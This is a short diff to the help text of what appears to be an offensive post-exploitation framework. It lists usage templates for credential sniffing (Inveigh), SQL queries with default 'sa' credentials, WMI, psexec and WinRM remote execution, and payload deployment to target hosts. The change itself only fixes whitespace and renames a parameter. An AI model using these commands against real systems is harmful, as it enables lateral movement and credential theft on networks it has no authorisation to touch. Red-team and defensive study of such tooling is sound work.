@@ -327,7 +327,7 @@ get-inveigh | stop-inveigh (gets output from inveigh thread)
 invoke-sniffer -outputfile c:\\temp\\output.txt -maxsize 50mb -localip 10.10.10.10
 invoke-sqlquery -sqlserver 10.0.0.1 -user sa -pass sa -query 'select @@version'
 invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\\system32\\cmd.exe -args " /c calc.exe"
-runas-netonly "domain" "username" "password" "ls \\\\mydc\\c$" 
+runas-netonly "domain" "username" "password" "ls \\\\mydc\\c$"
 invoke-pipekat -target <ip-optional> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
 invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>
 """
@@ -345,7 +345,7 @@ invoke-psexecpayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -has
 invoke-psexecproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
 invoke-psexecdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
 invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
-invoke-wmipayload -target <ip> -cred <credid>
+invoke-wmipayload -target <ip> -credid <credid>
 invoke-wmiproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
 invoke-wmidaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
 invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass>
